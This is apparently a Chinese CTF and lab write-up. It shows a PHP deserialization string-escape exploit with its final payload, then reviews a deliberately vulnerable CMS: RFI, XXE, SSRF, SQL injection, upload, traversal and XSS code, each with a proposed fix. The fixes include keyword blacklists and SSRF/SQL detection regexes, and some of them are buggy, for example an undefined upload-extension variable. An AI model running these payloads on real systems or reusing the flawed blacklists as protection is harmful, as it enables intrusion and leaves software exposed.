O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;aaaa&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125; 将4改为5，那么则认为name的值为 aaaa&quot;,此时因为前面的”无法闭合而导致反序列化失败。 而上面的程序中存在一个替换函数，只要name中存在bb则将其替换为ccc，导致name字段的长度会增加1，我们将逃逸的字符串的长度填充成我们要反序列化的代码的话那就可以控制反序列化的结果以及类里面的变量值了。那么就可以利用这个函数来构造出想要的序列化字符串。 例如想将pass变量的序列化字符串如下 &quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125; 其中 前面的 “;是为了闭合的变量的”，保证语法正确，}的作用是序列化字符串结束的标志 上面的字符串长度为27，所以就需要27个bb来产生27个字符长度的逃逸 &lt;?php function filter($str)&#123; return str_replace(&#x27;bb&#x27;, &#x27;ccc&#x27;, $str); &#125; class A&#123; public $name=&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;; public $pass=&#x27;123456&#x27;; &#125; $AA=new A(); var_dump(serialize($AA)); $res=filter(serialize($AA)); var_dump($res); $c=unserialize($res); echo $c-&gt;pass; //echo unserialize($AA); //&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125; ?&gt; //结果如下 ||为对齐 /* string(136) &quot;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&quot;|| string(163) &quot;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;||;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&quot; hacker */ 这里pass的值就被该称了hacker 总结：逃逸或者说被“顶”出来的payload就会被当做当前类的属性被执行。 而针对这道题，代码的意思大致为，POST提交一个uanme，password默认为1，之后生成一个序列化字符串并将字符串中的challenge换成easychallenge，字符长度增加4，当密码为easy时，得到flag。这题看上去与上面的例子差不多，但是构造的时候发现并不是 需要构造的属性 len(&quot;;s:4:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;) =29 可以发现上面的字符串长度为29，而每替换一个challenge只能逃逸出4个字符，不能构造出29，因此这里需要再构造出一个属性，使上面的字符串的长度为4的倍数。 &quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:4:&quot;aaaa&quot;;s:1:&quot;a&quot;;&#125; 上面构造出的payload长度为48因此还需要12个challenge。 exp如下 &lt;?php class a &#123; public $uname=&#x27;challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:4:&quot;aaaa&quot;;s:1:&quot;a&quot;;&#125;&#x27;; public $password=&quot;1&quot;; &#125; function filter($string)&#123; return str_replace(&#x27;challenge&#x27;,&#x27;easychallenge&#x27;,$string); &#125; $ser=filter(serialize(new a($uname,$password))); echo($ser); ?&gt; 输出的结果： O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:156:&quot;easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:4:&quot;aaaa&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125; //easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge 长度为156 finalpayload： challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:4:&quot;aaaa&quot;;s:1:&quot;a&quot;;&#125; 提交payload，获取flag 漏洞修复1.RFI代码分析代码位置application\\employee\\controller\\Index.php public function index() &#123; $file = @$_GET[&#x27;file&#x27;]; if (!isset($file) || $file == &#x27;&#x27;) &#123; $file = &#x27;info.php&#x27;; &#125; include &quot;$file&quot;; $info = []; $info = $info_1; return $this-&gt;fetch(&#x27;index&#x27;, [&#x27;info&#x27; =&gt; $info]); return view(); &#125; 这个代码很简单，就是包含了info.php文件按，并获取其中的$info参数，然后发送给前端，然后在前端显示内容。但是也很危险，因为有include函数的存在，所以存在RFI，而且对提交的参数没有任何的检查和过滤，很容易被攻击者利用 漏洞防御 方法一 修改php.ini文件，在其中添加 allow_url_open = off allow_url_include = off 构成RFI漏洞的条件十分苛刻，只有php.ini中上面两个配置项都没off才能利用该漏洞。 方法二 在代码中限制提交上的文件名，因为只需要包含about.php，所以检查提交上$file是否为about.php $file = @$_GET[&#x27;file&#x27;]; if (!isset($file) || $file == &#x27;&#x27;) &#123; $file = &#x27;info.php&#x27;; &#125; if($file !== &quot;info.php&quot;)&#123; return $this-&gt;error(&quot;文件名错误！&quot;) &#125; include &quot;$file&quot;; 2.XXE代码分析代码位置application\\advice\\controller\\Index.php public function index() &#123; $result = null; $code = 0; libxml_disable_entity_loader(false); $xmlfile = file_get_contents(&#x27;php://input&#x27;); if($xmlfile !== &quot;&quot;)&#123; $dom = new DOMDocument(); // var_dump($dom); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $username = $creds-&gt;username; $info = $creds-&gt;info; $conn = new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;, &quot;yzncms&quot;); if (!$conn) &#123; die(&quot;Connection failed: &quot; . mysqli_connect_error()); &#125; $sql = &quot;INSERT INTO yzn_new (name, info) values(&#x27;$username&#x27;,&#x27;$info&#x27;)&quot;; if($conn-&gt;query($sql))&#123; $code = 1; echo &quot;&lt;script&gt;alert(&#x27;提交成功！&#x27;)&lt;/script&gt;&quot;; $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username); &#125;else&#123; $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username); &#125; &#125; 前端代码 var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;info&gt;&quot; + info + &quot;&lt;/info&gt;&lt;/user&gt;&quot;; $.ajax(&#123; type: &quot;POST&quot;, url: &quot;/advice/index&quot;, contentType: &quot;application/xml;charset=utf-8&quot;, data: data, dataType: &quot;xml&quot;, anysc: false, success: function (result) &#123; var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue; if(code === &quot;0&quot;)&#123; $(&quot;.msg&quot;).text(&#x27;submit&#x27; + &quot;fail!&quot;); &#125;else &#123; $(&quot;.msg&quot;).text(&#x27;submit&#x27; + &quot;success!&quot;); &#125; &#125;, &#125;); 上面的两端代码，一个是前端的数据传送，一个是后端的数据处理 可以看到前端将用户提交的数据一xml格式以post方式发送给后端，而在后端中使用了$xmlfile = file_get_contents(&#39;php://input&#39;);，可以看到这里不仅使用了file_get_contents，而且使用了php伪协议php://input，这个协议可以读取用户用post方式提交的数据，这就意味着攻击者可以使用抓包的方式修改自己所提交的数据，从而引入外部实体，造成XXE漏洞，而最主要的原因是这段代码，这个函数参数伪true时，就是禁止引入外部实体，而这里选择了false libxml_disable_entity_loader(false) 漏洞防御 方法一 使用所开发的语言提供的禁用外部实体的方法 php中的是 也就是这个漏洞的防御方法 libxml_disable_entity_loader(true); java: DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false); python: from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 方法二 代码层面的防御，在代码中添加对用户提交数据的检测函数 比如 &lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC 上面的关键词是XMl实体中不可缺少的关键词，所以过滤后，可以大概率的防止XXE攻击 3.SSRF代码分析代码位置application\\info\\controller\\Index.php public function index() &#123; $url = @$_GET[&#x27;url&#x27;]; if (!isset($url) || $url == &#x27;&#x27;) &#123; $url = &#x27;https://sunzy.icu&#x27;; &#125; $url = &#x27;https://sunzy.icu&#x27;; if ($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); $co = curl_exec($ch); curl_close($ch); echo $co; &#125; // return view(); &#125; 在上面的代码中，需要接收一个参数url，如果参数为空，则赋值为https://sunzy.icu，否则直接进行curl初始化，然后进行访问，可以看到没有对提交的参数进行任何的检查和过滤，这是很危险的。 漏洞防御 方法一 黑名单 内网过滤，端口限制，协议限制只允许使用http/https 在这个系统中防御该SSRF漏洞其实非常简单，就是禁止提交参数，或者绑定参数代码如下 function check_inner_ip($url) &#123; //只允许http和https协议 $match_result = preg_match(&#x27;/^(http|https)?:\\/\\/.*(\\/)?.*$/&#x27;, $url); if (!$match_result) &#123; return $this-&gt;error(&#x27;url fomat error&#x27;); &#125; try &#123; $url_parse = parse_url($url); &#125; catch (Exception $e) &#123; return $this-&gt;error(&#x27;url fomat error&#x27;); &#125; $hostname = $url_parse[&#x27;host&#x27;]; $ip = gethostbyname($hostname); $int_ip = ip2long($ip); //不允许host为内网ip地址 return ip2long(&#x27;127.0.0.0&#x27;) &gt;&gt; 24 == $int_ip &gt;&gt; 24 || ip2long(&#x27;10.0.0.0&#x27;) &gt;&gt; 24 == $int_ip &gt;&gt; 24 || ip2long(&#x27;172.16.0.0&#x27;) &gt;&gt; 20 == $int_ip &gt;&gt; 20 || ip2long(&#x27;192.168.0.0&#x27;) &gt;&gt; 16 == $int_ip &gt;&gt; 16; &#125; 方法二 对于一般的SSRF防御，一般从一下几方面入手 限制协议为HTTP、HTTPS 不用限制302重定向 设置URL白名单或者限制内网IP 限制请求的端口为http常用的端口，比如，80,443,8080,8090 下面是自己编写的WAF $url = &quot;http://baidu.com/test&quot;; if(preg_match(&quot;/file|ftp|tftp|gopher|dict|localhost|127\\.0\\.0\\.1|3232235521|2130706433|0x|0177\\.0\\.0\\.01|0\\.0\\.0\\.0|xip|@/i&quot;,$url))&#123; return $this-&gt;error(&quot;you are a hacker!!!&quot;); &#125; 解释一下为什么要用上面的正则过滤url file|ftp|tftp|gopher|dict 是让改url只能使用http/https协议，这样可以避免大部分的攻击。 localhost|127.0.0.1 是为了防止攻击者探测内网端口，以免泄露一些容易被攻击的应用程序 3232235521|2130706433|0x|0177.0.0.01|0.0.0.0 这几个是为了防止攻击者对127.0.0.1进行八进制，十六进制，十进制的转码，从而绕过之前的检测 xip|@ 这两个是防止攻击者使用302跳转攻击 4.目录遍历漏洞分析nginx.conf location /files &#123; autoindex on; alias /var/www/public/uploads/; &#125; files后少写一个/ 输入urlhttp://192.168.164.147/files../时，相当于访问的是/var/www/public/uploads/../，所以访问的就是/var/www/public/目录。 漏洞防御该漏洞修复方法很简单 修改nginx.conf location /files/ &#123; autoindex on; alias /var/www/public/uploads/; &#125;5.SQL注入漏洞点一代码分析代码位置application\\change\\controller\\Changepass.php public function index() &#123; if($this-&gt;request-&gt;isPost()) &#123; $account = $_POST[&#x27;account&#x27;]; $password = $_POST[&#x27;password&#x27;]; $npassword = $_POST[&#x27;npassword&#x27;]; $newpassword = $_POST[&#x27;newpassword&#x27;]; if($account != &#x27;&#x27; &amp;&amp; $password != &#x27;&#x27; &amp;&amp; $npassword != &#x27;&#x27; &amp;&amp; $newpassword !=&#x27;&#x27;)&#123; if($npassword === $newpassword) &#123; $result = Db::query(&quot;select `username` from yzn_member where username=&#x27;$account&#x27;&quot;); if (!empty($result)) &#123; $sql = Db::query(&quot;select `password`,`encrypt` from yzn_member where username=&#x27;$account&#x27;&quot;); $encrypt = $sql[0][&#x27;encrypt&#x27;]; $encrypt_password = $password . $encrypt; if ($sql[0][&#x27;password&#x27;] === md5($encrypt_password)) &#123; $pwd = md5($newpassword.$encrypt); $change = Db::query(&quot;UPDATE `yzn_member` SET `password`=&#x27;$pwd&#x27; WHERE username=&#x27;$account&#x27;&quot;); return $this-&gt;success(&quot;successful!&quot;); &#125; else &#123; return $this-&gt;error(&quot;wrong password!&quot;); &#125; &#125; else &#123; return $this-&gt;error(&quot;no user!&quot;); &#125; &#125; else&#123; return $this-&gt;error(&quot;new password are different!&quot;); &#125; &#125;else&#123; return $this-&gt;error(&quot;please input content!!!&quot;); &#125; &#125; 这段代码的意思就是，先检查用户的输入是否为空，不为空则判断两次输入的新密码是否一样，一样先到数据库中查找该用户，如果有该用户，则取出该用户的密码和加密因子，然后判断旧密码是否正确，正确则将新密码和加密因子的md5值写入数据库，密码修改成功。 这里可以看到并没有返回查询的信息，但是也没有对用户输入的数据进行检查和过滤，所以攻击根据错误提示进行盲注攻击。 漏洞防御 方法一 对sql注入使用的关键词进行过滤，写一个waf对输入的数据进行检查 这里的话只需要对用户名进行过滤，因为只有用户名被带入到sql语句中进行查询 function inject_check($Sql_Str) &#123;//检测Sql的注入语句。 $check=preg_match(&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\\&#x27;|\\\\*|\\*|\\.\\.\\/|\\.\\/|union|and|ascii|substring|sleep/i&#x27;,$Sql_Str); if ($check) &#123; return $this-&gt;error(&quot;hacker!!!&quot;) &#125;else&#123; return $Sql_Str; &#125; &#125; 可以看到使用bp进行注入fuzzing，可以发现很多payload都已经被过滤 方法二 第一种方法很简单，就是限制用户名和密码的长度，然后对用户的输入进行长度限制 因为是用户名和密码位置，用户名的长度一般不会超过20个字符，密码也不会超过20个字符，那么这里只需要在用户提交完数据后，在后端检测用户名和密码的长度，这样就可以让sql注入攻击无法发挥威力，因为在20个字符范围之内很难构造出有效的攻击语句。 漏洞点二代码分析public function jifen()&#123; $msg = &quot;&quot;; $point=0; $id = $this-&gt;userid; $sql = Db::query(&quot;select `point` from yzn_member where id=&#x27;$id&#x27;&quot;)[0]; $point = (int)$sql[&#x27;point&#x27;]; if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;username&#x27;]!==&#x27;&#x27;)&#123; $username = $_POST[&#x27;username&#x27;]; $num = (int)$_POST[&#x27;num&#x27;]; if($username !== $this-&gt;userinfo[&#x27;username&#x27;] &amp;&amp; $num &lt;= $point)&#123; $result = Db::query(&quot;select `point` from yzn_member where username=&#x27;$username&#x27;&quot;)[0]; if(!empty($result))&#123; $new_point = (int)$result[&#x27;point&#x27;] + $num; $point = $point - $num; Db::query(&quot;UPDATE `yzn_member` SET `point`=&#x27;$point&#x27; WHERE id=&#x27;$id&#x27;&quot;); Db::query(&quot;UPDATE `yzn_member` SET `point`=&#x27;$new_point&#x27; WHERE username=&#x27;$username&#x27;&quot;); $msg = &quot;成功向&quot;.$username.&quot;赠送&quot;.(string)$num.&quot;积分!&quot;; return $this-&gt;fetch(&#x27;/jifen&#x27;,[&#x27;point&#x27;=&gt;$point,&#x27;msg&#x27;=&gt;$msg]); &#125;else&#123; $msg = &quot;不存在该用户！&quot;; return $this-&gt;fetch(&#x27;/jifen&#x27;,[&#x27;point&#x27;=&gt;$point,&#x27;msg&#x27;=&gt;$msg]); &#125; &#125;else&#123; $msg = &quot;注意用户名不能是自己且积分数点数需要小于自己当前积分!&quot;; return $this-&gt;fetch(&#x27;/jifen&#x27;,[&#x27;point&#x27;=&gt;$point,&#x27;msg&#x27;=&gt;$msg]); &#125; &#125; 在这段代码中会将用户提交的用户名带到sql语句中查询 $result = Db::query(&quot;select `point` from yzn_member where username=&#x27;$username&#x27;&quot;)[0]; 虽然此处没有返回值，但是如果查询失败就会提示$msg=&quot;不存在该用户！&quot;，导致攻击者可以使用盲注攻击 漏洞防御同样可以直接使用上面的过滤函数 漏洞点三代码分析application\\member\\controller\\Index.php中的finduser方法 public function finduser()&#123; $msg = &#x27;&#x27;; $email = &#x27;&#x27;; if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;username&#x27;]!==&#x27;&#x27;)&#123; $username = $_POST[&#x27;username&#x27;]; $deny_str = array(&#x27; &#x27;,&#x27;union&#x27;,&#x27;select&#x27;,&#x27;from&#x27;,&#x27;or&#x27;,&#x27;and&#x27;); $username = str_ireplace($deny_str,&#x27;&#x27;,$username); $result = Db::query(&quot;select `email` from yzn_member where username=&#x27;$username&#x27;&quot;)[0]; if (!empty($result))&#123; $email = $result[&#x27;email&#x27;]; $msg = &#x27;查询成功! &#x27;.$username.&#x27;的邮箱是:&#x27;; return $this-&gt;fetch(&#x27;/finduser&#x27;,[&#x27;msg&#x27;=&gt;$msg,&#x27;username&#x27;=&gt;$username,&#x27;email&#x27;=&gt;$email]); &#125;else&#123; $msg = &#x27;查询失败，&#x27;.$username.&#x27;不存在,请检查用户名是否正确!&#x27;; return $this-&gt;fetch(&#x27;/finduser&#x27;,[&#x27;msg&#x27;=&gt;$msg]); &#125; &#125; return $this-&gt;fetch(&#x27;/finduser&#x27;); &#125; 可以看到，对用户提交的数据进行了过滤，但是过滤的内容很少，而且很容易就被绕过 漏洞防御这里的防御就可以直接使用上面过滤函数 漏洞点四代码位置application\\member\\controller\\Content.php 代码分析$id = $this-&gt;request-&gt;param(&#x27;id&#x27;, 0); $info = Db::query(&#x27;SELECT * FROM `yzn_member_content` WHERE `uid` = &#x27;.$this-&gt;userid.&#x27; AND `id` = &#x27;.$id.&#x27; LIMIT 1&#x27;)[0]; if (empty($info)) &#123; $this-&gt;error(&#x27;稿件不存在！&#x27;); &#125; 这里直接将用户提交的数据id，带入到sql语句中查询，并且没有进行过滤 漏洞防御方法一 因为id是一个数字，那么直接对id这个参数进行限制，只允许用户提交数字型数据 if(!is_numeric($id))&#123; return $this-&gt;error(&quot;id必须是数字！&quot;) &#125; 方法二 与上面的方法二一样，对id参数进行过滤 6.暴力破解代码分析该漏洞存在于管理员后台登录，造成该漏洞的原因大多是因为管理人员没有修改初始密码，或者心存侥幸改成了比较常见的密码，这样就给了攻击者可乘之机，直接使用暴力破解就可以攻克后台管理页面。 代码位于application\\admin\\controller\\Index.php中的login()方法 //登录判断 public function login() &#123; $url = $this-&gt;request-&gt;get(&#x27;url&#x27;, &#x27;index/index&#x27;); if (User::instance()-&gt;isLogin()) &#123; $this-&gt;redirect(&#x27;admin/index/index&#x27;); &#125; if ($this-&gt;request-&gt;isPost()) &#123; $data = $this-&gt;request-&gt;post(); $keeplogin = $this-&gt;request-&gt;post(&#x27;keeplogin&#x27;); // 对提交数据进行检查 $rule = [ &#x27;username|用户名&#x27; =&gt; &#x27;require|alphaDash|length:3,20&#x27;, &#x27;password|密码&#x27; =&gt; &#x27;require|length:3,20&#x27;, &#x27;__token__&#x27; =&gt; &#x27;require|token&#x27;, ]; $result = $this-&gt;validate($data, $rule); if (true !== $result) &#123; $this-&gt;error($result, $url, [&#x27;token&#x27; =&gt; $this-&gt;request-&gt;token()]); &#125; if (User::instance()-&gt;login($data[&#x27;username&#x27;], $data[&#x27;password&#x27;], $keeplogin ? 86400 : 0)) &#123; $this-&gt;success(&#x27;恭喜您，登陆成功&#x27;, url(&#x27;admin/Index/index&#x27;)); &#125; else &#123; $msg = User::instance()-&gt;getError(); $msg = $msg ? $msg : &#x27;用户名或者密码错误!&#x27;; $this-&gt;error($msg, $url, [&#x27;token&#x27; =&gt; $this-&gt;request-&gt;token()]); &#125; &#125; else &#123; if (User::instance()-&gt;autologin()) &#123; $this-&gt;redirect(&#x27;admin/index/index&#x27;); &#125; return $this-&gt;fetch(); &#125; &#125; 虽然每次登录都需要带有token，但是也是不安全的，因为token的值是可以从前端页面获取的 漏洞防御防御方法就是限制管理员登录时密码输入的错误次数，当错误次数达到一定数量时，就锁定该账号，需要拥有数据库管理权限的真正管理员才能重新登录。 首先在数据库中创建一个表yzn_loginfo，里面只需要一个字段，用来记录admin账号连续输入错误密码的次数。 具体方法为 首先进入mysql容器内部 docker exec -it ed1c19bb4a95 bash 之后登录root账号，在数据库中建立一张表 CREATE TABLE IF NOT EXISTS `yzn_loginfo` ( `login_fail` int(10) NOT NULL ) ENGINE=MyISAM DEFAULT CHARSET=utf8; 修改代码application\\admin\\controller\\Index.php中的login()方法 其中戴// 是增加的代码 // 从yzn_loginfo表中获取到 login_fail的值 $login_fail = Db::query(&#x27;SELECT * FROM `yzn_loginfo`&#x27;)[0]; // $login_fail_count = $login_fail[&#x27;login_fail&#x27;]; // // 如果密码错误超过 5 则锁定账号 if($login_fail_count &gt;= 5)&#123; // $msg = &quot;账号被锁定，请联系网站管理员！&quot;; // $this-&gt;error($msg,$url); // &#125; if (User::instance()-&gt;login($data[&#x27;username&#x27;], $data[&#x27;password&#x27;], $keeplogin ? 86400 : 0)) &#123; // 如果输入的密码正确，说明是真正的admin，将login_fail值更新为0 Db::query(&#x27;UPDATE `yzn_loginfo` SET `login_fail`=0 WHERE `login_fail`=&#x27;.$login_fail_count); // $this-&gt;success(&#x27;恭喜您，登陆成功&#x27;, url(&#x27;admin/Index/index&#x27;)); &#125; else &#123; $msg = User::instance()-&gt;getError(); $msg = $msg ? $msg : &#x27;用户名或者密码错误!&#x27;; // 如果输入的密码不正确，则将login_fail的值+1后再到数据库中更新 $login_fail_count_new = $login_fail_count + 1; // Db::query(&#x27;UPDATE `yzn_loginfo` SET `login_fail`= &#x27;.$login_fail_count_new.&#x27; WHERE `login_fail`=&#x27;.$login_fail_count); // $this-&gt;error($msg, $url, [&#x27;token&#x27; =&gt; $this-&gt;request-&gt;token()]); &#125; 当连续输错五次密码时，账号就被锁定，此时没有任何人能够登录，必须到数据库中需改yzn_loginfo的login_fail的值，这也就达到了防止暴力破解的攻击。 即执行下面这个sql语句 UPDATE `yzn_loginfo` SET `login_fail`=0 WHERE `login_fail`= 5; 7.文件上传漏洞点一代码分析application\\member\\controller\\Index.php 中的photo方法 public function photo()&#123; $msg = &#x27;&#x27;; $path = &quot;./uploads/images/photo&quot;; define(&quot;UPLOAD_PATH&quot;,&quot;../public/uploads/images/photo&quot;); if (isset($_POST[&#x27;submit&#x27;]))&#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $path.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = &#x27;上传成功！&#x27;; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = $path . &#x27;文件夹不存在,请手工创建！&#x27;; echo $msg; &#125; &#125; return $this-&gt;fetch(&#x27;/photo&#x27;,[&#x27;msg&#x27;=&gt;$msg,&#x27;path&#x27;=&gt;$img_path]); &#125; 可以看到上面是使用黑名单，对含有黑名单后缀的文件进行替换，显示这样是很不安全的，使用双写即可绕过，造成了文件上传漏洞 漏洞防御 public function photo()&#123; $msg = &#x27;&#x27;; $path = &quot;./uploads/images/photo&quot;; define(&quot;UPLOAD_PATH&quot;,&quot;../public/uploads/images/photo&quot;); if (isset($_POST[&#x27;submit&#x27;]))&#123; if (file_exists(UPLOAD_PATH)) &#123; $uploaded_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $uploaded_size = $_FILES[ &#x27;upload_file&#x27; ][ &#x27;size&#x27; ]; $uploaded_type = $_FILES[ &#x27;upload_file&#x27; ][ &#x27;type&#x27; ]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; //文件上传漏洞修复 $img_path = $path.&#x27;/&#x27;.$uploaded_name; if( ( strtolower( $uploaded_ext ) == &#x27;jpg&#x27; || strtolower( $uploaded_ext ) == &#x27;gif&#x27; || strtolower( $uploaded_ext ) == &#x27;png&#x27; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) &amp;&amp; ( $uploaded_type == &#x27;image/jpeg&#x27; || $uploaded_type == &#x27;image/png&#x27;|| $uploaded_type == &#x27;image/gif&#x27; ) ) &#123; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = &#x27;上传成功！&#x27;; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125;else&#123; $this-&gt;error(&quot;文件类型不正确&quot;) &#125; &#125; else &#123; $msg = $path . &#x27;文件夹不存在,请手工创建！&#x27;; echo $msg; &#125; &#125; return $this-&gt;fetch(&#x27;/photo&#x27;,[&#x27;msg&#x27;=&gt;$msg,&#x27;path&#x27;=&gt;$img_path]); &#125; 其中if中的条件如下 ( strtolower( $uploaded_ext ) == &#39;jpg&#39; || strtolower( $uploaded_ext ) == &#39;gif&#39; || strtolower( $uploaded_ext ) == &#39;png&#39; ) 保证文件后缀名只能是jpg gif png的一个 ( $uploaded_type == &#39;image/jpeg&#39; || $uploaded_type == &#39;image/png&#39;|| $uploaded_type == &#39;image/gif&#39; ) 文件的MIME必须为三者中的一个 ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) 这是保证文件的大小小10M，并且文件不能空 漏洞点二代码分析改代码位于application\\attachment\\controller\\Upload.php中的saveFile方法 if ($size_limit &gt; 0 &amp;&amp; ($file-&gt;getInfo(&#x27;size&#x27;) &gt; $size_limit)) &#123; return json([ &#x27;status&#x27; =&gt; 0, &#x27;info&#x27; =&gt; &#x27;附件过大&#x27;, &#x27;state&#x27; =&gt; &#x27;附件过大&#x27;, //兼容百度 &#x27;message&#x27; =&gt; &#x27;附件过大&#x27;, //兼容editormd ]); &#125; // 判断附件格式是否符合 $file_name = $file-&gt;getInfo(&#x27;name&#x27;); $error_msg = &#x27;&#x27;; if ($error_msg != &#x27;&#x27;) &#123; return json([ &#x27;code&#x27; =&gt; -1, &#x27;info&#x27; =&gt; $error_msg, &#x27;state&#x27; =&gt; $error_msg, //兼容百度 &#x27;message&#x27; =&gt; $error_msg, //兼容editormd ]); &#125; 可以看到这段代码中只是对上传附件的大小进行了检查，而没有对文件的后缀和文件的MIME进行检查，这样攻击者就可以任意的上传文件，造成文件上传漏洞，危害还是很大的。 漏洞防御方法一 对于其的防御方法就是获取文件的类型然后检查其是否符合要求。这里只允许上传png,jpg,jpeg,gif,bmp类型的文件 $file_ext = strtolower(substr($file_name, strrpos($file_name, &#x27;.&#x27;) + 1));//获取文件的后缀名 // 获取文件的MiME,注意这里不是从客户端的请求头中获取的，而是根据文件的后缀名从php函数中获取，这样就可以防止攻击者修改MIME进行欺骗 try &#123; $fileMine = $file-&gt;getMime(); &#125; catch (\\Exception $ex) &#123; $error_msg = $ex-&gt;getMessage(); &#125; // 禁止MIME为text/x-php或text/html if ($fileMine == &#x27;text/x-php&#x27; || $fileMine == &#x27;text/html&#x27;) &#123; $error_msg = &#x27;禁止上传非法文件！&#x27;; &#125; //禁止后缀名为php的 if (preg_grep(&quot;/php/i&quot;, $ext_limit)) &#123; $error_msg = &#x27;禁止上传非法文件！&#x27;; &#125; // 禁止上传文件名后缀名在$ext_limit中的 if (!preg_grep(&quot;/$file_ext/i&quot;, $ext_limit)) &#123; $error_msg = &#x27;附件类型不正确！&#x27;; &#125; if (!in_array($file_ext, $ext_limit)) &#123; $error_msg = &#x27;附件类型不正确！&#x27;; &#125; // 禁止上传php,html后缀的文件 if($file_ext == &quot;php&quot; || $file_ext == &quot;html&quot;) &#123; $error_msg = &#x27;禁止上传非法文件！&#x27;; &#125; 方法二 对保存文件的目录修改权限。 已经知道，用户上传的文件会被保存到的public/uploads/images目录下，首先查看一下该文件的权限信息 ls -ld images/ 可以看到这是777权限，很明显这个权限设置是不合理的，那么我们将其改为744权限 chmod -R 744 images/ 再来查看之前上传上的木马文件就会发现文件不存在，这样就会避免了一句话木马的危害 8.XSS漏洞点一代码分析if ($this-&gt;request-&gt;isPost()) &#123; $data = $this-&gt;request-&gt;post(&#x27;info/a&#x27;); $data[&#x27;send_from&#x27;] = $this-&gt;_userinfo[&#x27;username&#x27;]; if (!MemberModel::getByUsername($data[&#x27;send_to&#x27;])) &#123; return $this-&gt;error(&#x27;用户不存在&#x27;); &#125; if ($this-&gt;modelClass-&gt;allowField(true)-&gt;save($data)) &#123; $this-&gt;success(&#x27;发送成功！&#x27;); &#125; else &#123; $this-&gt;error(&#x27;发送失败！&#x27;); &#125; 